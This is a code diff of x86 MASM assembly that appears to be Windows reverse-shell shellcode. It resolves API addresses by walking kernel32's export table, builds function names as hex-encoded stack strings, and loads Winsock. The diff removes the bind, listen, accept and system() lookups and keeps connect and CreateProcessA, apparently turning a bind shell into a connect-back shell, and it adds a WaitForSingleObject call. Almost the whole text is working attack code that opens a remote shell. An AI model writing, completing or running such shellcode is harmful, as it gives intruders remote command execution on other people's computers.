@@ -4,7 +4,7 @@ Option CaseMap:None
 .Code
 start:
 
-Assume Fs:Nothing
+	Assume Fs:Nothing
 	Sub Esp, 0B8H
 	Xor Eax, Eax
 	Mov [Ebp - 4H], Eax			; This will store the number of exported function in kernel32.dll
@@ -13,16 +13,10 @@ Assume Fs:Nothing
 	Mov [Ebp - 10H], Eax			; This will store the address of ordinal table
 	Mov [Ebp - 14H], Eax			; This will store the address of GetProcAddress
 	Mov [Ebp - 18H], Eax			; This will store the address of LoadLibraryA
-	Mov [Ebp - 1CH], Eax			; This will store the address of msvcrt.dll
+	Mov [Ebp - 1CH], Eax			; This will store WaitForSingleObject base address
 	Mov [Ebp - 20H], Eax			; This will store ws2_32.dll base address
 	Mov [Ebp - 24H], Eax			; This will store WSStartup base address
 	Mov [Ebp - 28H], Eax			; This will store WSASocketA base address
-	Mov [Ebp - 32H], Eax			; This will store bind base address
-	Mov [Ebp - 36H], Eax			; This will store listen base address
-	Mov [Ebp - 3AH], Eax			; This will store accept base address
-	Mov [Ebp - 3EH], Eax			; This will store SetStdhandle() base address
-	Mov [Ebp - 42H], Eax			; This will store bind base address
-	Mov [Ebp - 46H], Eax			; This will store system() base address
 	Mov [Ebp - 4AH], Eax			; This will store connect() base address
 	Mov [Ebp - 4EH], Eax			; This will store the address of CreateProcessA
 
@@ -111,18 +105,6 @@ getFunctionAddress:
 	Call Edx				; Call GetProcAddress
 	Mov [Ebp - 18H], Eax			; Saving LoadLibraryA address
 
-	; Load SetStdHandle
-	Add Esp, 0CH
-	Xor Ecx, Ecx
-	Mov Edx, [Ebp - 14H]
-	Push 656C646EH
-	Push 61486474H
-	Push 53746553H
-	Push Esp
-	Push Ebx
-	Call Edx				; Call GetProcAddress
-	Mov [Ebp - 3EH], Eax			; Saving SetStdHandle()
-
 	; Load CreateProcessA
 	Add Esp, 0CH
 	Xor Ecx, Ecx
@@ -137,34 +119,24 @@ getFunctionAddress:
 	Call Edx
 	Mov [Ebp - 4EH], Eax			; Saving CreateProcessA()
 
-	; Load msvcrt.dll using LoadLibraryA
-	Add Esp, 10H				; Clear CreateProcessA from the stack
-	Xor Ecx, Ecx
-	Mov Eax, [Ebp - 18H]			; Move LoadLibraryA address to eax
-	Mov Cx, 6C6CH
-	Push Ecx
-	Push 642E7472H
-	Push 6376736DH
-	Push Esp				; msvcrt.dll
-	Call Eax
-	Mov [Ebp - 1CH], Eax
-
-	; Get system() base address
-	Add Esp, 0CH				; Clear msvcrt.dll from the stack
-	Xor Ecx, Ecx
+	; Load WaitForSingleObject
+	Add Esp, 0CH
 	Mov Edx, [Ebp - 14H]
-	Mov Cx, 6D65H				; em
-	Push Ecx
-	Push 74737973H				; syt
-	Push Esp				; system
-	Push Eax				; msvcrt.dll base address
-	Call Edx				; Call GetProcAddress
-	Mov [Ebp - 46H], Eax			; Saving system base address
+	Push 61746365H
+	Sub DWord Ptr [Esp + 3H], 61H
+	Push 6A624F65H
+	Push 6C676E69H
+	Push 53726F46H
+	Push 74696157H
+	Push Esp				; WaitForSingleObject
+	Push Ebx
+	Call Edx
+	Mov [Ebp - 1CH], Eax			; Saving WaitForSingleObject()
 
 	; The returned data is saved to eax register
 	; Load ws2_32.dll using LoadLibraryA
 	Mov Eax, [Ebp - 18H]
-	Add Esp, 8H				; Clear system from the stack
+	Add Esp, 14H				; Clear WaitForSingleObject from the stack
 	Xor Ecx, Ecx
 	Mov Cx, 6C6CH				; ll
 	Push Ecx
@@ -175,7 +147,7 @@ getFunctionAddress:
 	Mov [Ebp - 20H], Eax			; Saving ws2_32 base address
 
 	; Get WSAStartup address
-	Add Esp, 0CH				; Clear user32.dll from the stack
+	Add Esp, 0CH				; Clear ws2_32.dll from the stack
 	Xor Ecx, Ecx
 	Mov Edx, [Ebp - 14H]
 	Mov Cx, 7075H
@@ -201,45 +173,8 @@ getFunctionAddress:
 	Call Edx				; GetProcAddress
 	Mov [Ebp - 28H], Eax			; Saving WSASocketA base address
 
-	; Get bind base address
-	Add Esp, 0CH				; Clear WSASocketA from the stack
-	Xor Ecx, Ecx
-	Mov Edx, [Ebp - 14H]
-	Mov Eax, [Ebp - 20H]
-	Push 646E6962H
-	Push Esp 				; bind
-	Push Eax				; ws2_32.dll base address
-	Call Edx				; GetProcAddress
-	Mov [Ebp - 32H], Eax			; Saving bind address
-
-	; Get listen base address
-	Add Esp, 4H				; Clear WSASocketA from the stack
-	Xor Ecx, Ecx
-	Mov Edx, [Ebp - 14H]
-	Mov Eax, [Ebp - 20H]
-	Mov Cx, 6E65H
-	Push Ecx
-	Push 7473696CH
-	Push Esp 				; listen
-	Push Eax				; ws2_32.dll base address
-	Call Edx				; GetProcAddress
-	Mov [Ebp - 36H], Eax			; Saving listen base address
-
-	; Get accept base address
-	Add Esp, 8H
-	Xor Ecx, Ecx
-	Mov Edx, [Ebp - 14H]
-	Mov Eax, [Ebp - 20H]
-	Mov Cx, 7470H
-	Push Ecx
-	Push 65636361H
-	Push Esp 				; accept
-	Push Eax				; ws2_32.dll base address
-	Call Edx				; GetProcAddress
-	Mov [Ebp - 3AH], Eax			; Saving accept base address
-
 	; Get connect() base address
-	Add Esp, 8H
+	Add Esp, 0CH				; Clear WSASocketA from the stack
 	Xor Ecx, Ecx
 	Mov Edx, [Ebp - 14H]
 	Mov Eax, [Ebp - 20H]
@@ -333,5 +268,12 @@ zero_mem_struct:
 	Push Ebx						; lpApplicationName
 	Mov Eax, [Ebp - 4EH]					; eax = CreateProcessA base address
 	Call Eax						; Call CreateProcessA
+
+	; Calling WaitForSingleObject
+	Mov Edx, [Ebp - 1CH]					; Save WaitForSingleObject base address to edx
+	Mov Eax, Esp						; eax = pointer to PROCESS_INFORMATON structure
+	Push Ebx						; dwMiliseconds = 0
+	Push Eax
+	Call Edx						; Call WaitForSingleObject
 
 End start
